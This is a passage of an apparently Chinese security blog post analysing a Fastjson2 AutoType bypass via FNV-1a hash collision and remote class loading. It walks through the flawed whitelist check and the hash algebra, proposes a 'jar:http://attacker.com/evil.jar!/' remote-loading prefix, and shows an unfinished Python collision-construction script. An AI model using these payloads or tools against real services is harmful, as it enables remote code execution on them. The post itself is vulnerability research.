@@ -1,0 +1,1586 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fastjson2 FNV-1a 哈希碰撞 AutoType 绕过 RCE 分析与复现 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>Fastjson2 FNV-1a 哈希碰撞 AutoType 绕过 RCE 分析与复现</h1>
+<time>2026-08-01</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: fastjson2-fnv-1a-哈希碰撞-autotype-绕过-rce-分析与复现</li>
+</ul>
+<hr />
+<h2>目录</h2>
+<ul>
+<li><a href="#一漏洞概述与影响面">一、漏洞概述与影响面</a></li>
+<li><a href="#二fastjson-type-机制详解">二、Fastjson @type 机制详解</a></li>
+<li><a href="#三fnv-1a-哈希算法原理深度分析">三、FNV-1a 哈希算法原理深度分析</a></li>
+<li><a href="#四哈希碰撞构造方法与脚本实现">四、哈希碰撞构造方法与脚本实现</a></li>
+<li><a href="#五contextclassloader-远程加载机制">五、ContextClassLoader 远程加载机制</a></li>
+<li><a href="#六完整攻击链-poc-实战">六、完整攻击链 PoC 实战</a></li>
+<li><a href="#七与-cve-2026-16723fastjson-1x-对比分析">七、与 CVE-2026-16723（Fastjson 1.x）对比分析</a></li>
+<li><a href="#八fastjson-漏洞史时间线">八、Fastjson 漏洞史时间线</a></li>
+<li><a href="#九防御方案">九、防御方案</a></li>
+<li><a href="#十总结与反思">十、总结与反思</a></li>
+<li><a href="#免责声明">免责声明</a></li>
+</ul>
+<hr />
+<h2>一、漏洞概述与影响面</h2>
+<h3>1.1 漏洞背景</h3>
+<p>2026 年，Fastjson2 曝出编号 QVD-2026-45876 的严重漏洞，CVSS 3.1 评分高达 9.8 分，逼近满分 10 分。该漏洞的恐怖之处在于：<strong>在完全默认配置下即可触发，无需管理员显式开启 <code>SupportAutoType</code></strong>。这意味着所有使用 Fastjson2 ≤ 2.0.62 进行 JSON 反序列化的应用，只要存在一个接收用户输入并解析为 JSON 的接口，就面临远程代码执行风险。</p>
+<p>该漏洞由两个独立的缺陷协同构成：</p>
+<ol>
+<li><strong>FNV-1a 哈希碰撞</strong>：Fastjson2 在判断类型是否安全时，仅依据增量 FNV-1a 哈希结果进行白名单判断，未进一步校验类型名称明文。攻击者可构造哈希碰撞的恶意类型名称——哈希值命中白名单，但实际指向恶意类。</li>
+<li><strong>ContextClassLoader 远程加载</strong>：在 Spring Boot fat-JAR 部署环境中，利用嵌套 JAR URL 协议突破类型限制，通过 <code>jar:http://</code> 协议从远程 HTTP 服务器下载并加载恶意类，静态代码块在类加载时自动执行。</li>
+</ol>
+<p>与此同时，Fastjson 1.x 也被披露了 CVE-2026-16723，影响 1.2.68-1.2.83 版本。该漏洞利用 <code>checkAutoType()</code> 中的 <code>getResourceAsStream(typeName.replace('.', '/') + ".class")</code> 资源探测路径，同样实现 Gadget-free、默认配置可利用的 RCE，且已在野利用。</p>
+<h3>1.2 影响范围评估</h3>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>受影响库</td>
+<td>Fastjson2 ≤ 2.0.62</td>
+</tr>
+<tr>
+<td>部署形态</td>
+<td>Spring Boot fat-JAR（2.x / 3.x / 4.x）</td>
+</tr>
+<tr>
+<td>JDK 版本</td>
+<td>JDK 8 / 11 / 17 / 21</td>
+</tr>
+<tr>
+<td>触发条件</td>
+<td>默认配置，任何接收 JSON 输入的接口</td>
+</tr>
+<tr>
+<td>攻击前置</td>
+<td>攻击者可发送 HTTP 请求</td>
+</tr>
+<tr>
+<td>需要额外依赖</td>
+<td>无（纯 JDK 内置类）</td>
+</tr>
+<tr>
+<td>在野利用</td>
+<td>已确认</td>
+</tr>
+</tbody>
+</table>
+<p>Fastjson2 作为 Fastjson 1.x 的继任者，在国内 Java 生态中广泛使用。根据 Maven Central 下载数据和各类企业技术栈调研，保守估计全球有百万级 Spring Boot 项目使用了 Fastjson2 作为 JSON 序列化/反序列化库。</p>
+<hr />
+<h2>二、Fastjson @type 机制详解</h2>
+<h3>2.1 @type 的正常用途</h3>
+<p>Fastjson 的 <code>@type</code> 字段是实现多态反序列化的核心机制。其设计意图是：当 JSON 数据需要反序列化为接口或抽象类的具体实现时，通过 <code>@type</code> 字段指定实际类型。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 正常用途：指定接口的具体实现类</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.example.Cat&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Tom&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;color&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;gray&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1">// Java 端定义</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">Animal</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Cat</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Animal</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">color</span><span class="p">;</span>
+<span class="w">    </span><span class="c1">// getters/setters...</span>
+<span class="p">}</span>
+
+<span class="c1">// 反序列化</span>
+<span class="n">Animal</span><span class="w"> </span><span class="n">animal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Animal</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
+<span class="c1">// animal 实际是 Cat 实例</span>
+</code></pre></div>
+
+<p>这种设计在 RPC 框架、配置中心、消息队列等场景中非常实用，但它也引入了一个根本性的安全风险：<strong>反序列化的类型由攻击者通过 JSON 数据控制</strong>。</p>
+<h3>2.2 @type 的安全风险</h3>
+<p>当 <code>@type</code> 指向一个攻击者精心构造的类时，Fastjson 会：</p>
+<ol>
+<li><strong>加载该类</strong>：调用 <code>Class.forName</code> 或 <code>ClassLoader.loadClass</code></li>
+<li><strong>实例化对象</strong>：调用无参构造函数</li>
+<li><strong>设置属性</strong>：调用 setter 方法或直接反射设置字段</li>
+</ol>
+<p>这三步中的任何一步都可能触发危险操作：</p>
+<ul>
+<li><strong>构造函数/静态代码块</strong>：类加载时自动执行 <code>static {}</code> 代码块</li>
+<li><strong>setter 方法</strong>：某些类的 setter 包含副作用（如 JNDI lookup、URL 连接）</li>
+<li><strong>getter 方法</strong>：Fastjson 在某些场景下会调用 getter（如 <code>toString</code> 触发链）</li>
+</ul>
+<h3>2.3 Fastjson2 的 AutoType 防御体系</h3>
+<p>Fastjson2 相比 1.x 重构了 AutoType 防御体系，核心是 <code>JSONFactory</code> 中的 <code>checkAutoType</code> 机制：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Fastjson2 简化版 checkAutoType 逻辑</span>
+<span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="nf">checkAutoType</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 1. 内置类型快速通过</span>
+<span class="w">    </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">builtin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getBuiltinType</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">builtin</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">builtin</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 2. ★ FNV-1a 哈希白名单检查 ★</span>
+<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fnv1a_64</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isInInternalWhitelist</span><span class="p">(</span><span class="n">hash</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 哈希命中白名单 → 直接通过，不再校验明文！</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 3. FNV-1a 哈希黑名单检查</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isInDenylist</span><span class="p">(</span><span class="n">hash</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s">&quot;autoType is not support: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 4. SupportAutoType 开关检查</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">supportAutoType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s">&quot;autoType is not support: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 5. 用户白名单检查</span>
+<span class="w">    </span><span class="c1">// ...</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><strong>关键缺陷在第 2 步</strong>：白名单判断仅依据 FNV-1a 哈希值，不校验类型名称明文。如果攻击者能构造一个与白名单类型哈希相同但实际不同的字符串，就能绕过白名单检查。</p>
+<h3>2.4 为什么默认配置可触发</h3>
+<p>Fastjson2 中存在一批"内部白名单"类型——这些类型被认为是安全的（如基本包装类、集合类等），<strong>无论是否开启 <code>SupportAutoType</code>，只要哈希命中内部白名单就直接放行</strong>。</p>
+<p>这意味着即使管理员明确关闭了 <code>SupportAutoType</code>，攻击者仍可通过构造哈希碰撞的恶意类型名，使其哈希值命中内部白名单，从而绕过 AutoType 限制。</p>
+<hr />
+<h2>三、FNV-1a 哈希算法原理深度分析</h2>
+<h3>3.1 FNV-1a 算法公式</h3>
+<p>FNV-1a（Fowler-Noll-Vo 1a）是一种非加密哈希函数，以其计算速度快和分布均匀著称。其 64 位版本的定义如下：</p>
+<div class="highlight"><pre><span></span><code>FNV-1a 64-bit:
+    hash = FNV_offset_basis (初始值: 0xcbf29ce484222325)
+    for each byte in input:
+        hash = hash XOR byte
+        hash = hash * FNV_prime (素数: 0x100000001b3)
+    return hash
+</code></pre></div>
+
+<p><strong>增量计算特性</strong>：FNV-1a 的一个重要特性是<strong>增量可计算</strong>。即：</p>
+<div class="highlight"><pre><span></span><code>hash(&quot;AB&quot;) = (hash(&quot;A&quot;) XOR &#39;B&#39;) * FNV_prime
+</code></pre></div>
+
+<p>这意味着可以在遍历字符串的过程中逐步计算哈希值，而不需要等待整个字符串读取完毕。Fastjson 正是利用这一特性，在逐字符扫描类名的同时进行黑/白名单检查，一旦中途某个前缀的哈希命中黑名单就立即拒绝。</p>
+<h3>3.2 Fastjson2 中的哈希白名单实现</h3>
+<p>Fastjson2 使用 FNV-1a 64 位哈希来存储和检索黑/白名单：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Fastjson2 中的 FNV-1a 实现</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TypeUtils</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">fnv1a_64_magic_hashcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xcbf29ce484222325L</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">fnv1a_64_magic_prime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x100000001b3L</span><span class="p">;</span>
+
+<span class="w">    </span><span class="cm">/**</span>
+<span class="cm">     * 计算 FNV-1a 64 位哈希</span>
+<span class="cm">     */</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">fnv1a_64</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">hashCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fnv1a_64_magic_hashcode</span><span class="p">;</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">key</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+<span class="w">            </span><span class="c1">// ★ 注意：使用 char 而非 byte，高位字节参与运算</span>
+<span class="w">            </span><span class="n">hashCode</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">ch</span><span class="p">;</span>
+<span class="w">            </span><span class="n">hashCode</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="n">fnv1a_64_magic_prime</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">hashCode</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/**</span>
+<span class="cm">     * 增量哈希检查（逐字符扫描时使用）</span>
+<span class="cm">     */</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">fnv1a_64_increment</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="n">currentHash</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">ch</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">currentHash</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">ch</span><span class="p">;</span>
+<span class="w">        </span><span class="n">currentHash</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="n">fnv1a_64_magic_prime</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">currentHash</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>白名单检查的实现：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// JSONFactory 中的白名单检查（简化）</span>
+<span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isInternalWhitelist</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="n">hash</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 使用二分查找或哈希表查找</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">Arrays</span><span class="p">.</span><span class="na">binarySearch</span><span class="p">(</span><span class="n">internalWhitelistHashes</span><span class="p">,</span><span class="w"> </span><span class="n">hash</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 内部白名单哈希值数组（预计算）</span>
+<span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">long</span><span class="o">[]</span><span class="w"> </span><span class="n">internalWhitelistHashes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">fnv1a_64</span><span class="p">(</span><span class="s">&quot;java.lang.String&quot;</span><span class="p">),</span><span class="w">      </span><span class="c1">// 字符串</span>
+<span class="w">    </span><span class="n">fnv1a_64</span><span class="p">(</span><span class="s">&quot;java.lang.Integer&quot;</span><span class="p">),</span><span class="w">     </span><span class="c1">// 整数</span>
+<span class="w">    </span><span class="n">fnv1a_64</span><span class="p">(</span><span class="s">&quot;java.lang.Long&quot;</span><span class="p">),</span><span class="w">        </span><span class="c1">// 长整型</span>
+<span class="w">    </span><span class="n">fnv1a_64</span><span class="p">(</span><span class="s">&quot;java.util.ArrayList&quot;</span><span class="p">),</span><span class="w">   </span><span class="c1">// 列表</span>
+<span class="w">    </span><span class="n">fnv1a_64</span><span class="p">(</span><span class="s">&quot;java.util.HashMap&quot;</span><span class="p">),</span><span class="w">     </span><span class="c1">// 哈希表</span>
+<span class="w">    </span><span class="c1">// ... 更多白名单类型</span>
+<span class="p">};</span>
+</code></pre></div>
+
+<h3>3.3 哈希碰撞的数学基础</h3>
+<p>FNV-1a 是一个 64 位哈希函数，其输出空间为 2^64。对于任意给定的目标哈希值 <code>H</code>，存在大量不同的输入字符串 <code>S</code> 使得 <code>fnv1a_64(S) = H</code>。</p>
+<p>FNV-1a 的碰撞构造利用了其代数结构。关键观察：</p>
+<div class="highlight"><pre><span></span><code>对于两个字符 c1 和 c2，如果存在变换使得:
+    (hash XOR c1) <span class="gs">* prime = (hash XOR c2) *</span> prime + delta
+其中 delta 可以通过后续字符的哈希调整补偿
+</code></pre></div>
+
+<p>更直接的碰撞构造方法基于 FNV-1a 的<strong>乘法可逆性</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="err">已知</span><span class="o">:</span><span class="w"> </span><span class="n">hash_final</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="n">hash_prev</span><span class="w"> </span><span class="n">XOR</span><span class="w"> </span><span class="n">byte</span><span class="o">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">prime</span>
+<span class="err">则</span><span class="o">:</span><span class="w">   </span><span class="n">hash_prev</span><span class="w"> </span><span class="n">XOR</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash_final</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">prime</span><span class="o">^(-</span><span class="mi">1</span><span class="o">)</span><span class="w">  </span><span class="o">(</span><span class="n">mod</span><span class="w"> </span><span class="mi">2</span><span class="o">^</span><span class="mi">64</span><span class="o">)</span>
+</code></pre></div>
+
+<p>由于 <code>prime</code> 是奇数，在 mod 2^64 下存在乘法逆元 <code>prime^(-1)</code>。这意味着对于任意目标哈希值和任意前缀，都可以<strong>逆向求解</strong>出后续需要追加的字符序列。</p>
+<h3>3.4 哈希碰撞的可行性分析</h3>
+<table>
+<thead>
+<tr>
+<th>因素</th>
+<th>分析</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>哈希空间</td>
+<td>2^64</td>
+<td>生日攻击需 2^32 次尝试，但定向构造无需暴力</td>
+</tr>
+<tr>
+<td>字符限制</td>
+<td>类名仅允许 <code>[A-Za-z0-9_$./]</code></td>
+<td>限制可用的碰撞字符</td>
+</tr>
+<tr>
+<td>增量特性</td>
+<td>前缀哈希已知时可逆向求解</td>
+<td>使定向碰撞可行</td>
+</tr>
+<tr>
+<td>乘法逆元</td>
+<td>prime 在 mod 2^64 下可逆</td>
+<td>使逆向求解数学可行</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>四、哈希碰撞构造方法与脚本实现</h2>
+<h3>4.1 碰撞构造策略</h3>
+<p>目标：构造一个字符串 <code>evil_name</code>，使得 <code>fnv1a_64(evil_name) == fnv1a_64("java.lang.String")</code>，但 <code>evil_name != "java.lang.String"</code>。</p>
+<p><strong>策略：前缀固定 + 尾部调整</strong></p>
+<ol>
+<li>选择一个固定前缀（如 <code>jar:http://attacker.com/evil.jar!/</code>）</li>
+<li>计算该前缀的 FNV-1a 哈希值 <code>H_prefix</code></li>
+<li>计算目标哈希值 <code>H_target = fnv1a_64("java.lang.String")</code></li>
+<li>逆向求解需要追加的字符序列，使得从 <code>H_prefix</code> 出发最终达到 <code>H_target</code></li>
+</ol>
+<h3>4.2 逆向求解算法</h3>
+<div class="highlight"><pre><span></span><code>设当前哈希为 h，需要追加字符 c 使得最终哈希等于 H_target
+
+单步逆向：
+    h_next = (h XOR c) <span class="gs">* prime</span>
+<span class="gs">    =&gt; h XOR c = h_next *</span> prime_inv
+    =&gt; c = (h_next * prime_inv) XOR h
+
+但我们需要 c 是合法的类名字符（[A-Za-z0-9_$./]）
+因此采用多步搜索：
+    从 H_target 逆向，逐步确定每个字符
+</code></pre></div>
+
+<h3>4.3 Python 碰撞构造脚本</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">Fastjson2 FNV-1a 哈希碰撞构造工具</span>
+<span class="sd">构造与白名单类型哈希相同但内容不同的恶意类型名</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="c1"># FNV-1a 64-bit 常量</span>
+<span class="n">FNV_OFFSET_BASIS</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325</span>
+<span class="n">FNV_PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3</span>
+<span class="n">MASK_64</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">fnv1a_64</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;计算字符串的 FNV-1a 64 位哈希&quot;&quot;&quot;</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">FNV_OFFSET_BASIS</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">h</span> <span class="o">^=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+        <span class="n">h</span> <span class="o">=</span> <span class="p">(</span><span class="n">h</span> <span class="o">*</span> <span class="n">FNV_PRIME</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK_64</span>
+    <span class="k">return</span> <span class="n">h</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">mod_inverse</span><span class="p">(</span><span class="n">a</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">m</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;扩展欧几里得算法求模逆元&quot;&quot;&quot;</span>
+    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">extended_gcd</span><span class="p">(</span><span class="n">a</span> <span class="o">%</span> <span class="n">m</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Modular inverse does not exist for </span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s2"> mod </span><span class="si">{</span><span class="n">m</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">extended_gcd</span><span class="p">(</span><span class="n">a</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;扩展欧几里得算法&quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span>
+    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">extended_gcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">g</span><span class="p">,</span> <span class="n">y</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">,</span> <span class="n">x</span>
+
+
+<span class="c1"># FNV_PRIME 的模逆元</span>
+<span class="n">FNV_PRIME_INV</span> <span class="o">=</span> <span class="n">mod_inverse</span><span class="p">(</span><span class="n">FNV_PRIME</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">reverse_step</span><span class="p">(</span><span class="n">h</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">ch</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    逆向单步 FNV-1a:</span>
+<span class="sd">    forward: h_next = (h XOR ch) * prime</span>
+<span class="sd">    reverse: h = (h_next * prime_inv) XOR ch</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="p">((</span><span class="n">h</span> <span class="o">*</span> <span class="n">FNV_PRIME_INV</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK_64</span><span class="p">)</span> <span class="o">^</span> <span class="n">ch</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">find_collision</span><span class="p">(</span><span class="n">target_hash</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">prefix</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+                   <span class="n">allowed_chars</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span> <span class="n">max_depth</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">10</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    BFS/DFS 搜索: 找到 suffix 使得 fnv1a_64(prefix + suffix) == target_hash</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        target_hash: 目标哈希值</span>
+<span class="sd">        prefix: 固定前缀</span>
+<span class="sd">        allowed_chars: 允许的字符集</span>
+<span class="sd">        max_depth: 最大搜索深度</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">allowed_chars</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="c1"># 类名合法字符 + URL 字符</span>
+        <span class="n">allowed_chars</span> <span class="o">=</span> <span class="s2">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_./:$-&quot;</span>
+
+    <span class="n">prefix_hash</span> <span class="o">=</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Prefix: </span><span class="si">{</span><span class="n">prefix</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
